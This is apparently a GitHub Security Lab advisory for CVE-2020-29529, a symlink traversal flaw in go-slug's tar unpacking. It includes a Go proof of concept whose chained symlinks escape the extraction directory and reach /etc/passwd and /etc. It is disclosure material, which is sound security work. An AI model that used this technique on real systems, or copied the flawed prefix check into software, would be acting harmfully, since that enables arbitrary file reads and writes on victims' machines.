<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">January 12, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-262: Unsafe handling of symbolic links in go-slug unpacking routine - CVE-2020-29529</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/ghsecuritylab">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/61799930?s=35" height="35" width="35">
        <span>GitHub Security Lab</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>11/30/2020: reported to security@hashicorp.com</li>
  <li>11/30/2020: issue is acknowledged</li>
  <li>12/03/2020: go-slug 0.5 is released containing a fix for this vulnerability</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The unsafe handling of symbolic links in an unpacking routine may enable attackers to read and/or write to arbitrary locations outside the designated target folder.</p>

<h2 id="product">Product</h2>

<p>go-slug</p>

<h2 id="tested-version">Tested Version</h2>

<p>Latest commit at the time of reporting (November 27, 2020).</p>

<h2 id="details">Details</h2>

<h3 id="unsafe-handling-of-symbolic-links-in-unpacking-routine">Unsafe handling of symbolic links in unpacking routine</h3>

<p>The routine <a href="https://github.com/hashicorp/go-slug/blob/master/slug.go#L206"><code class="language-plaintext highlighter-rouge">Unpack</code></a> attempts to guard against creating symbolic links that point outside the directory a tar archive is extracted to. However, a malicious tarball first linking  <code class="language-plaintext highlighter-rouge">subdir/parent</code> to <code class="language-plaintext highlighter-rouge">..</code> (allowed, because <code class="language-plaintext highlighter-rouge">subdir/..</code> falls within the archive root) and then linking <code class="language-plaintext highlighter-rouge">subdir/parent/escapes</code> to <code class="language-plaintext highlighter-rouge">..</code> results in a symbolic link pointing to the tarball’s parent directory, contrary to the routine’s goals.</p>

<p>Proof of concept, using a version of <code class="language-plaintext highlighter-rouge">Unpack</code> tweaked to accept an array of tar headers instead of working from an actual tar archive:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
  <span class="s">"archive/tar"</span>
  <span class="s">"fmt"</span>
  <span class="s">"os"</span>
  <span class="s">"path/filepath"</span>
  <span class="s">"strings"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">var</span> <span class="n">headers</span> <span class="p">[]</span><span class="n">tar</span><span class="o">.</span><span class="n">Header</span> <span class="o">=</span> <span class="nb">make</span><span class="p">([]</span><span class="n">tar</span><span class="o">.</span><span class="n">Header</span><span class="p">,</span> <span class="m">3</span><span class="p">)</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/parent"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">=</span> <span class="s">".."</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span>

  <span class="n">headers</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/parent/passwd"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">=</span> <span class="s">"../../etc/passwd"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span>

  <span class="n">headers</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/parent/etc"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">=</span> <span class="s">"../../etc"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span>

  <span class="n">Unpack</span><span class="p">(</span><span class="n">headers</span><span class="p">,</span> <span class="s">"/tmp/extracthere"</span><span class="p">)</span>
<span class="p">}</span>

<span class="c">// Unpack is used to read and extract the contents of a slug to the dst</span>
<span class="c">// directory. Symlinks within the slug are supported, provided their targets</span>
<span class="c">// are relative and point to paths within the destination directory.</span>
<span class="k">func</span> <span class="n">Unpack</span><span class="p">(</span><span class="n">headers</span> <span class="p">[]</span><span class="n">tar</span><span class="o">.</span><span class="n">Header</span><span class="p">,</span> <span class="n">dst</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>

  <span class="c">// Unpackage all the contents into the directory.</span>
  <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">header</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">headers</span> <span class="p">{</span>

    <span class="c">// Get rid of absolute paths.</span>
    <span class="n">path</span> <span class="o">:=</span> <span class="n">header</span><span class="o">.</span><span class="n">Name</span>
    <span class="k">if</span> <span class="n">path</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'/'</span> <span class="p">{</span>
      <span class="n">path</span> <span class="o">=</span> <span class="n">path</span><span class="p">[</span><span class="m">1</span><span class="o">:</span><span class="p">]</span>
    <span class="p">}</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>

    <span class="c">// Make the directories to the path.</span>
    <span class="n">dir</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Dir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">MkdirAll</span><span class="p">(</span><span class="n">dir</span><span class="p">,</span> <span class="m">0755</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
      <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"Failed to create directory %q: %v"</span><span class="p">,</span> <span class="n">dir</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="c">// Handle symlinks.</span>
    <span class="k">if</span> <span class="n">header</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">==</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span> <span class="p">{</span>
      <span class="c">// Disallow absolute targets.</span>
      <span class="k">if</span> <span class="n">filepath</span><span class="o">.</span><span class="n">IsAbs</span><span class="p">(</span><span class="n">header</span><span class="o">.</span><span class="n">Linkname</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"Invalid symlink (%q -&gt; %q) has absolute target"</span><span class="p">,</span>
          <span class="n">header</span><span class="o">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">header</span><span class="o">.</span><span class="n">Linkname</span><span class="p">)</span>
      <span class="p">}</span>

      <span class="c">// Ensure the link target is within the destination directory. This</span>
      <span class="c">// disallows providing symlinks to external files and directories.</span>
      <span class="n">target</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">dir</span><span class="p">,</span> <span class="n">header</span><span class="o">.</span><span class="n">Linkname</span><span class="p">)</span>
      <span class="k">if</span> <span class="o">!</span><span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">dst</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"Invalid symlink (%q -&gt; %q) has external target"</span><span class="p">,</span>
          <span class="n">header</span><span class="o">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">header</span><span class="o">.</span><span class="n">Linkname</span><span class="p">)</span>
      <span class="p">}</span>

      <span class="c">// Create the symlink.</span>
      <span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Symlink</span><span class="p">(</span><span class="n">header</span><span class="o">.</span><span class="n">Linkname</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"Failed creating symlink (%q -&gt; %q): %v"</span><span class="p">,</span>
          <span class="n">header</span><span class="o">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">header</span><span class="o">.</span><span class="n">Linkname</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
      <span class="p">}</span>

    <span class="p">}</span>

  <span class="p">}</span>
  <span class="k">return</span> <span class="no">nil</span>
<span class="p">}</span>

</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to arbitrary file write (with same permissions as the program running the unpack operation) if the attacker can control the archive file. Additionally, if the attacker has read access to the unpacked files, he may be able to read arbitrary system files the parent process has permissions to read.</p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2020-29529</li>
</ul>

<h2 id="resources">Resources</h2>
<ul>
  <li><a href="https://github.com/hashicorp/go-slug/commit/28cafc59c8da6126a3ae94dfa84181df4073454f">Fix commit</a></li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub team member <a href="https://github.com/smowton">@smowton (Chris Smowton)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-262</code> in any communication regarding this issue.</p>

